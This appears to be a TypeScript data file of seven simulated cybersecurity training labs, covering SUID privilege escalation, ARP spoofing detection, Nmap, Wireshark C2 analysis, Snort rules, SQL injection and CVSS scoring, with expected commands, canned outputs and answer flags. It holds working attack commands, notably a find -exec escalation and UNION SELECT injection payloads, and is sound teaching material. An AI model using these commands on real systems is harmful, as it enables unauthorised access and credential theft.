import { PracticalLab } from '../types';

export const CYBER_LABS_DATA: PracticalLab[] = [
  // 1. Linux Command Exercise
  {
    id: 'lab-linux-suid-privesc',
    title: 'Linux Permissions & SUID Binary Privilege Escalation',
    category: 'Linux Fundamentals',
    difficulty: 'Beginner',
    durationMinutes: 45,
    authorizedTarget: '10.10.10.15 (sandbox-linux-01.local)',
    objective: 'Audit file permissions, identify dangerous SUID-enabled binaries on an unprivileged user shell, and exploit a misconfigured utility to retrieve the root flag.',
    scenarioBriefing: 'You have gained initial low-privilege SSH access as user "student" on a compromised Debian server. Your task is to perform local security auditing, identify any binary with the SUID bit set, and uncover the system secret stored in /root/proof.txt.',
    steps: [
      {
        id: 'step-1',
        instruction: 'Inspect current user privileges and group memberships using "id" and "whoami".',
        expectedCommand: 'id',
        validationRegex: 'uid=1001'
      },
      {
        id: 'step-2',
        instruction: 'Search the entire filesystem for binaries with SUID permissions (octal -4000) while suppressing error outputs.',
        expectedCommand: 'find / -perm -4000 -type f 2>/dev/null',
        validationRegex: '/usr/bin/find'
      },
      {
        id: 'step-3',
        instruction: 'Examine permissions on /usr/bin/find to verify it is owned by root and has the SUID bit active.',
        expectedCommand: 'ls -la /usr/bin/find',
        validationRegex: '-rwsr-xr-x'
      },
      {
        id: 'step-4',
        instruction: 'Execute the find command with the -exec parameter to read the restricted /root/proof.txt flag file.',
        expectedCommand: 'find . -exec cat /root/proof.txt \\; -quit',
        validationRegex: 'SBC\\{.*\\}'
      }
    ],
    hints: [
      'Standard find SUID search syntax: find / -perm -u=s -type f 2>/dev/null',
      'The find binary allows executing shell commands through the -exec flag: find . -exec cat /root/proof.txt \\; -quit'
    ],
    expectedFlag: 'SBC{5u1d_pr1v1l3g3_3sc4l4t10n_m45t3r}',
    flagDescription: 'Root flag retrieved from /root/proof.txt after SUID exploitation',
    downloadableMaterials: [
      {
        id: 'mat-lin-1',
        name: 'audit_suid_permissions.sh',
        type: 'script',
        size: '14 KB',
        description: 'Automated bash audit script to detect misconfigured SUID and SGID binaries.',
        filename: 'audit_suid_permissions.sh',
        mockDownloadContent: `#!/bin/bash\n# SBCyberBasics Academy - SUID Audit Tool\necho "[*] Auditing SUID binaries on $(hostname)..."\nfind / -perm -4000 -type f 2>/dev/null | while read binary; do\n  ls -ld "$binary"\ndone\necho "[+] Audit complete."`
      },
      {
        id: 'mat-lin-2',
        name: 'gtfobins_suid_reference.pdf',
        type: 'pdf',
        size: '420 KB',
        description: 'Reference sheet of Unix binaries commonly abused for privilege escalation.',
        filename: 'gtfobins_suid_reference.pdf'
      }
    ],
    simulatedTerminalResponses: {
      'id': 'uid=1001(student) gid=1001(student) groups=1001(student),27(sudo)',
      'whoami': 'student',
      'uname -a': 'Linux sandbox-linux-01 5.15.0-89-generic #99-Ubuntu SMP x86_64 GNU/Linux',
      'find / -perm -4000 -type f 2>/dev/null': '/usr/lib/openssh/ssh-keysign\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/find\n/usr/bin/chsh',
      'ls -la /usr/bin/find': '-rwsr-xr-x 1 root root 328400 Oct 14 18:22 /usr/bin/find',
      'find . -exec cat /root/proof.txt \\; -quit': 'SBC{5u1d_pr1v1l3g3_3sc4l4t10n_m45t3r}',
      'cat /root/proof.txt': 'cat: /root/proof.txt: Permission denied (student is not root)',
      'help': 'Available commands: id, whoami, uname -a, find, ls, cat, clear, exit'
    }
  },

  // 2. Networking Exercise
  {
    id: 'lab-net-arp-spoofing',
    title: 'Networking & ARP Poisoning Man-in-the-Middle Inspection',
    category: 'Networking',
    difficulty: 'Beginner',
    durationMinutes: 40,
    authorizedTarget: '192.168.10.0/24 (sandbox-vlan10.local)',
    objective: 'Investigate ARP cache tables, detect Gratuitous ARP spoofing attacks poisoning a gateway MAC address, and locate the attacker node.',
    scenarioBriefing: 'Workstation 192.168.10.14 suddenly experienced connection slowdowns and intermittent TLS certificate warnings. Telemetry suggests an unauthorized device on the local broadcast domain is conducting an ARP cache poisoning attack.',
    steps: [
      {
        id: 'step-1',
        instruction: 'Display the workstation local ARP table using "arp -a" or "ip neigh".',
        expectedCommand: 'arp -a',
        validationRegex: '192.168.10.1'
      },
      {
        id: 'step-2',
        instruction: 'Inspect the MAC address assigned to gateway 192.168.10.1 and host 192.168.10.88.',
        expectedCommand: 'ip neigh show',
        validationRegex: '00:0c:29:ab:cd:99'
      },
      {
        id: 'step-3',
        instruction: 'Identify which rogue IP address shares the exact duplicate MAC address with the default router.',
        expectedCommand: 'cat /etc/network/arp_incident.log',
        validationRegex: 'SBC\\{.*\\}'
      }
    ],
    hints: [
      'In an ARP poisoning attack, two different IP addresses will resolve to the SAME physical MAC address in the ARP cache.',
      'Check the MAC address of 192.168.10.1 and notice that 192.168.10.88 has an identical hardware address.'
    ],
    expectedFlag: 'SBC{4rp_c4ch3_p0150n1ng_d3t3ct3d}',
    flagDescription: 'Security flag obtained upon identifying duplicate MAC address conflict',
    downloadableMaterials: [
      {
        id: 'mat-net-1',
        name: 'arp_mitm_capture.pcap',
        type: 'pcap',
        size: '1.8 MB',
        description: 'Wireshark packet trace containing unsolicited Gratuitous ARP packets.',
        filename: 'arp_mitm_capture.pcap'
      }
    ],
    simulatedTerminalResponses: {
      'arp -a': '? (192.168.10.1) at 00:0c:29:ab:cd:99 [ether] on eth0\n? (192.168.10.88) at 00:0c:29:ab:cd:99 [ether] on eth0\n? (192.168.10.15) at 00:0c:29:11:22:33 [ether] on eth0',
      'ip neigh show': '192.168.10.1 dev eth0 lladdr 00:0c:29:ab:cd:99 REACHABLE\n192.168.10.88 dev eth0 lladdr 00:0c:29:ab:cd:99 REACHABLE',
      'cat /etc/network/arp_incident.log': '[CRITICAL ALERT]: Gateway 192.168.10.1 MAC overwritten by 192.168.10.88.\nFlag: SBC{4rp_c4ch3_p0150n1ng_d3t3ct3d}'
    }
  },

  // 3. Nmap Scanning Exercise
  {
    id: 'lab-nmap-recon-discovery',
    title: 'Nmap Port Scanning, Versioning & NSE Script Auditing',
    category: 'Nmap Scanning',
    difficulty: 'Intermediate',
    durationMinutes: 50,
    authorizedTarget: '10.10.10.45 (training-host.academy.local)',
    objective: 'Perform professional port reconnaissance using TCP SYN scans, fingerprint running daemon versions, and execute Nmap NSE scripts to detect an exposed backdoor.',
    scenarioBriefing: 'As part of an authorized penetration test on internal host 10.10.10.45, discover all active listening services, identify their exact software versions, and run safe vulnerability scripts to reveal the administration token.',
    steps: [
      {
        id: 'step-1',
        instruction: 'Execute a fast TCP SYN scan with aggressive timing on target 10.10.10.45.',
        expectedCommand: 'nmap -sS -T4 10.10.10.45',
        validationRegex: '21/tcp|22/tcp|80/tcp'
      },
      {
        id: 'step-2',
        instruction: 'Run service version detection (-sV) on ports 21, 22, 80, and 8080.',
        expectedCommand: 'nmap -sV -p 21,22,80,8080 10.10.10.45',
        validationRegex: 'vsftpd 2.3.4|OpenSSH 8.9p1'
      },
      {
        id: 'step-3',
        instruction: 'Run the Nmap Scripting Engine (NSE) vulnerability check against the FTP service.',
        expectedCommand: 'nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.45',
        validationRegex: 'SBC\\{.*\\}'
      }
    ],
    hints: [
      'Use -sS for stealth SYN scans and -sV for service version detection.',
      'vsftpd 2.3.4 has a historic smiley face backdoor trigger (:)) covered by the ftp-vsftpd-backdoor NSE script.'
    ],
    expectedFlag: 'SBC{nm4p_n53_b4ckd00r_d15c0v3r3d}',
    flagDescription: 'Discovery flag revealed by the Nmap NSE backdoor script output',
    downloadableMaterials: [
      {
        id: 'mat-nmap-1',
        name: 'nmap_cheat_sheet_pro.pdf',
        type: 'cheatsheet',
        size: '640 KB',
        description: 'Comprehensive Nmap command reference with timing flags, scan types, and NSE categories.',
        filename: 'nmap_cheat_sheet_pro.pdf'
      }
    ],
    simulatedTerminalResponses: {
      'nmap -sS -T4 10.10.10.45': `Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-12 10:14 UTC\nNmap scan report for training-host.academy.local (10.10.10.45)\nHost is up (0.00045s latency).\nNot shown: 996 closed tcp ports (reset)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 1.42 seconds`,
      'nmap -sV -p 21,22,80,8080 10.10.10.45': `Starting Nmap 7.94 ( https://nmap.org )\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 2.3.4\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4\n80/tcp   open  http    Apache httpd 2.4.52\n8080/tcp open  http    Werkzeug/2.2.2 Python/3.10.12`,
      'nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.45': `PORT   STATE SERVICE\n21/tcp open  ftp\n| ftp-vsftpd-backdoor:\n|   VULNERABLE:\n|   vsFTPd version 2.3.4 backdoor\n|     State: VULNERABLE (Exploitable)\n|     IDs: CVE:CVE-2011-2523\n|     Results: Remote root shell confirmed.\n|_    Extracted Flag: SBC{nm4p_n53_b4ckd00r_d15c0v3r3d}`
    }
  },

  // 4. Wireshark Traffic Analysis Exercise
  {
    id: 'lab-wireshark-c2-beaconing',
    title: 'Wireshark Forensic Analysis: Threat Hunting & C2 Beaconing',
    category: 'Wireshark Analysis',
    difficulty: 'Intermediate',
    durationMinutes: 55,
    authorizedTarget: 'Forensic PCAP Archive: c2_beacon_trace.pcap',
    objective: 'Analyze an enterprise PCAP capture, isolate infected endpoints communicating with an external Command & Control (C2) server, and extract the exfiltrated credential string.',
    scenarioBriefing: 'Endpoint Detection telemetry alerted on periodic HTTP POST requests leaving a corporate workstation at exact 60-second intervals (jitter = 0%). Download the PCAP capture and investigate the payload.',
    steps: [
      {
        id: 'step-1',
        instruction: 'Download "c2_beacon_trace.pcap" from the downloadable materials panel.',
        expectedCommand: 'tshark -r c2_beacon_trace.pcap -c 5',
        validationRegex: 'c2_beacon_trace'
      },
      {
        id: 'step-2',
        instruction: 'Apply Wireshark display filter for HTTP POST requests: http.request.method == "POST".',
        expectedCommand: 'tshark -r c2_beacon_trace.pcap -Y "http.request.method == \\"POST\\""',
        validationRegex: 'POST /api/telemetry/heartbeat'
      },
      {
        id: 'step-3',
        instruction: 'Inspect the TCP stream payload of the POST request to decode the URI parameter.',
        expectedCommand: 'tshark -r c2_beacon_trace.pcap -Y "http.request.method == \\"POST\\"" -T fields -e http.file_data',
        validationRegex: 'SBC\\{.*\\}'
      }
    ],
    hints: [
      'Filter for HTTP POST requests directed to external IP 203.0.113.88.',
      'Look into the JSON request body containing "secret_token".'
    ],
    expectedFlag: 'SBC{c2_b34c0n_d3t3ct3d_1n_tr4ff1c}',
    flagDescription: 'Flag carved from the encrypted C2 heartbeat payload',
    downloadableMaterials: [
      {
        id: 'mat-wire-1',
        name: 'c2_beacon_trace.pcap',
        type: 'pcap',
        size: '3.4 MB',
        description: 'Authentic packet capture of malware beaconing to external attacker infrastructure.',
        filename: 'c2_beacon_trace.pcap'
      },
      {
        id: 'mat-wire-2',
        name: 'wireshark_display_filters_cheatsheet.pdf',
        type: 'pdf',
        size: '510 KB',
        description: 'SOC analyst reference guide for Wireshark display filters and stream carving.',
        filename: 'wireshark_display_filters.pdf'
      }
    ],
    simulatedTerminalResponses: {
      'tshark -r c2_beacon_trace.pcap -c 5': '  1 0.000000 192.168.1.105 → 203.0.113.88 TCP 74 49214 → 80 [SYN]\n  2 0.024100 203.0.113.88 → 192.168.1.105 TCP 74 80 → 49214 [SYN, ACK]\n  3 0.024250 192.168.1.105 → 203.0.113.88 TCP 66 49214 → 80 [ACK]',
      'tshark -r c2_beacon_trace.pcap -Y "http.request.method == \\"POST\\""': ' 14 0.038100 192.168.1.105 → 203.0.113.88 HTTP 298 POST /api/telemetry/heartbeat HTTP/1.1\n 89 60.03920 192.168.1.105 → 203.0.113.88 HTTP 298 POST /api/telemetry/heartbeat HTTP/1.1',
      'tshark -r c2_beacon_trace.pcap -Y "http.request.method == \\"POST\\"" -T fields -e http.file_data': '{"bot_id":"wks-finance-04","status":"idle","auth_token":"SBC{c2_b34c0n_d3t3ct3d_1n_tr4ff1c}"}'
    }
  },

  // 5. Snort IDS/IPS Exercise
  {
    id: 'lab-snort-signature-authoring',
    title: 'Snort 3 Intrusion Detection: Writing Custom Signatures',
    category: 'Snort IDS/IPS',
    difficulty: 'Intermediate',
    durationMinutes: 45,
    authorizedTarget: 'Snort IDS Engine (eth0 interface: 10.10.10.0/24)',
    objective: 'Author, validate, and test custom Snort 3 rule signatures to detect web exploitation patterns and SQL injection signatures in real-time packets.',
    scenarioBriefing: 'Your security operations center needs an intrusion detection signature to flag any attacker attempting to extract database tables using "UNION SELECT" keywords over HTTP.',
    steps: [
      {
        id: 'step-1',
        instruction: 'Inspect the existing Snort local configuration file /etc/snort/rules/local.rules.',
        expectedCommand: 'cat /etc/snort/rules/local.rules',
        validationRegex: 'local.rules'
      },
      {
        id: 'step-2',
        instruction: 'Author a Snort rule that alerts on TCP traffic to port 80 containing the nocase content "UNION SELECT".',
        expectedCommand: 'snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -T',
        validationRegex: 'Snort successfully validated the configuration'
      },
      {
        id: 'step-3',
        instruction: 'Replay the test packet file against Snort in console alert mode to verify the signature fires.',
        expectedCommand: 'snort -c /etc/snort/snort.lua -r /tmp/test_sqli.pcap -A alert_fast',
        validationRegex: 'SBC\\{.*\\}'
      }
    ],
    hints: [
      'Snort rule header format: alert tcp any any -> any 80 (msg:"..."; content:"UNION SELECT"; nocase; sid:1000001; rev:1;)',
      'Always test configuration syntax with the -T flag before running live.'
    ],
    expectedFlag: 'SBC{sn0rt_51gn4tur3_3ng1n33r}',
    flagDescription: 'Validation flag generated upon successful signature match against SQL injection replay',
    downloadableMaterials: [
      {
        id: 'mat-snort-1',
        name: 'sqli_detection.rules',
        type: 'rules',
        size: '4 KB',
        description: 'Sample Snort 3 rules file for web application attack vectors.',
        filename: 'sqli_detection.rules',
        mockDownloadContent: `# Snort 3 Rules - SQL Injection Defenses\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS 80 (msg:"[SBC] SQL Injection Detected in URI"; flow:to_server,established; content:"UNION SELECT"; nocase; http_uri; sid:1000001; rev:1;)`
      }
    ],
    simulatedTerminalResponses: {
      'cat /etc/snort/rules/local.rules': '# /etc/snort/rules/local.rules\n# Write custom academy detection rules below:\nalert tcp any any -> any 80 (msg:"[SBC-RULE-1001] Potential SQLi UNION Payload"; content:"UNION SELECT"; nocase; sid:1000001; rev:1;)',
      'snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -T': '--------------------------------------------------\nSnort successfully validated the configuration (with 0 warnings).\n--------------------------------------------------',
      'snort -c /etc/snort/snort.lua -r /tmp/test_sqli.pcap -A alert_fast': '11/12-10:24:18.992810 [**] [1:1000001:1] [SBC-RULE-1001] Potential SQLi UNION Payload [**] [Priority: 1] {TCP} 10.10.10.88:49210 -> 10.10.10.15:80\n[SUCCESS]: Signature validated! Flag: SBC{sn0rt_51gn4tur3_3ng1n33r}'
    }
  },

  // 6. Web Security Exercise
  {
    id: 'lab-web-sqli-union',
    title: 'Web Application Security: Union-Based SQL Injection',
    category: 'Web Security',
    difficulty: 'Intermediate',
    durationMinutes: 50,
    authorizedTarget: 'http://10.10.10.25/vulnerable-catalog (dvwa-lab.local)',
    objective: 'Exploit an un-sanitized SQL query parameter to extract hidden administrative credentials and discover the database system flag.',
    scenarioBriefing: 'The academy target product search page at /products.php?id=1 concatenates user input directly into an SQL statement without prepared statements. Map the column count and extract the administrator password hash.',
    steps: [
      {
        id: 'step-1',
        instruction: 'Test the input parameter for SQL syntax vulnerability using single quote: id=1\'.',
        expectedCommand: 'curl -s "http://10.10.10.25/products.php?id=1\'"',
        validationRegex: 'syntax error|SQL error'
      },
      {
        id: 'step-2',
        instruction: 'Determine the exact column count using ORDER BY clauses: id=1 ORDER BY 3-- -.',
        expectedCommand: 'curl -s "http://10.10.10.25/products.php?id=1+ORDER+BY+3--+-"',
        validationRegex: 'Product 1'
      },
      {
        id: 'step-3',
        instruction: 'Extract database records using UNION SELECT 1,username,password FROM users-- -.',
        expectedCommand: 'curl -s "http://10.10.10.25/products.php?id=-1+UNION+SELECT+1,username,password+FROM+users--+-"',
        validationRegex: 'SBC\\{.*\\}'
      }
    ],
    hints: [
      'In SQL injection, using an invalid initial ID (like -1) forces the database to return records from the UNION SELECT statement.',
      'Remember to comment out the remainder of the server query using "-- -".'
    ],
    expectedFlag: 'SBC{un10n_sql1_3xtr4ct10n_succ355}',
    flagDescription: 'Administrator flag extracted from the backend MySQL database table',
    downloadableMaterials: [
      {
        id: 'mat-web-1',
        name: 'sqli_methodology_guide.pdf',
        type: 'pdf',
        size: '720 KB',
        description: 'Complete OWASP guide to detecting In-Band, Blind, and Time-based SQL injections.',
        filename: 'sqli_methodology_guide.pdf'
      }
    ],
    simulatedTerminalResponses: {
      'curl -s "http://10.10.10.25/products.php?id=1\'"': '<b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax near "\'" at line 1 in /var/www/html/products.php:12',
      'curl -s "http://10.10.10.25/products.php?id=1+ORDER+BY+3--+-"': '<div class="product"><h3>Product 1: Cyber Firewall Router</h3><p>Price: $499.00</p></div>',
      'curl -s "http://10.10.10.25/products.php?id=1+ORDER+BY+4--+-"': '<b>Unknown column 4 in order clause</b>',
      'curl -s "http://10.10.10.25/products.php?id=-1+UNION+SELECT+1,username,password+FROM+users--+-"': '<div class="product"><h3>Admin Account: superadmin</h3><p>Secret Flag: SBC{un10n_sql1_3xtr4ct10n_succ355}</p></div>'
    }
  },

  // 7. Guided Vulnerability Assessment Exercise
  {
    id: 'lab-vuln-assessment-cvss',
    title: 'Guided Vulnerability Assessment & CVSS v3.1 Scoring',
    category: 'Vulnerability Assessment',
    difficulty: 'Intermediate',
    durationMinutes: 45,
    authorizedTarget: 'Target Assessment Report: asset_audit_report.json',
    objective: 'Review discovered vulnerability telemetry on a healthcare server, calculate the CVSS v3.1 Base Score, and construct a remediation advisory.',
    scenarioBriefing: 'An unauthenticated remote code execution flaw was identified in an exposed medical record web service running on Apache Struts. Calculate the Base Metric vector and formulate the remediation steps.',
    steps: [
      {
        id: 'step-1',
        instruction: 'Inspect the automated scanner finding report /tmp/asset_audit_report.json.',
        expectedCommand: 'cat /tmp/asset_audit_report.json',
        validationRegex: 'CVE-2017-5638'
      },
      {
        id: 'step-2',
        instruction: 'Audit the CVSS v3.1 vector: Attack Vector (AV:N), Attack Complexity (AC:L), Privileges Required (PR:N), User Interaction (UI:N).',
        expectedCommand: 'cvss-calc AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
        validationRegex: 'CVSS Base Score: 9.8'
      },
      {
        id: 'step-3',
        instruction: 'Verify the advisory remediation recommendations to complete the assessment.',
        expectedCommand: 'cat /tmp/remediation_token.txt',
        validationRegex: 'SBC\\{.*\\}'
      }
    ],
    hints: [
      'CVE-2017-5638 is a Critical severity flaw with CVSS Base Score 9.8 (Critical).',
      'The mitigation requires upgrading Apache Struts to the patched release.'
    ],
    expectedFlag: 'SBC{cv55_9_8_cr1t1c4l_4ss3ssm3nt}',
    flagDescription: 'Assessment completion flag generated upon calculating the correct CVSS vector',
    downloadableMaterials: [
      {
        id: 'mat-vuln-1',
        name: 'vulnerability_report_template.pdf',
        type: 'pdf',
        size: '390 KB',
        description: 'Standard industry reporting template for executive and technical vulnerability disclosures.',
        filename: 'vulnerability_report_template.pdf'
      }
    ],
    simulatedTerminalResponses: {
      'cat /tmp/asset_audit_report.json': '{\n  "vulnerability_id": "CVE-2017-5638",\n  "title": "Apache Struts2 Remote Code Execution via Jakarta Multipart Parser",\n  "port": 443,\n  "service": "https",\n  "impact": "Full System Compromise"\n}',
      'cvss-calc AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H': 'CVSS v3.1 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nCVSS Base Score: 9.8 (CRITICAL)\nRating: Exploitable without credentials over the network.',
      'cat /tmp/remediation_token.txt': 'Assessment validated. Patch advisory generated.\nFlag: SBC{cv55_9_8_cr1t1c4l_4ss3ssm3nt}'
    }
  }
];
